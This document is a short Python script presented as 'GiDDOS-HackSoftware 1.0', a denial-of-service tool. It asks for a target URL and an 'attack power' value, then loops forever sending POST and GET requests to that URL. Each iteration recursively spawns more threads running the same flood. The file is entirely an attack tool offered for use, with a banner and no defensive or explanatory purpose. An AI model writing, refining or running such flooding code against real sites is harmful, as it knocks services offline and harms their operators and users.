import requests
from colorama import init
from colorama import Fore, Back, Style
from threading import Thread
init()

print ( Fore.GREEN + "Product version 1.0 ")
print ( Fore.YELLOW + "■□■□■" + Fore.GREEN + " GiDDOS-HackSoftware 1.0 ║ BY TUSSA AND ALEXAGEN " + Fore.YELLOW + "■□■□■" + Fore.GREEN )
print()
print ( "    _____ _ _____  _____   ____   _____  " + Fore.RED + "V.1.0" + Fore.GREEN )   
print ( "   / ____(_)  __ \|  __ \ / __ \ / ____| " ) 
print ( "  | |  __ _| |  | | |  | | |  | | (___   " ) 
print ( "  | | |_ | | |  | | |  | | |  | |\___ \  " )
print ( "  | |__| | | |__| | |__| | |__| |____) | " )
print ( "   \_____|_|_____/|_____/ \____/|_____/  " )
print ()
print ()
url = input( "Url ( example: https:\\\example.com ) ► " )
thrnom = input( "DDOS Atack Power ( example: 1000 ) ► " )
def ddos():
    while(1<10):
        spam = requests.post(url)
        spam2 = requests.get(url)
        for i in range(int(thrnom)):
            thr = Thread(target = ddos)
            thr.start()
            print('DDOS Atack is running...')
ddos()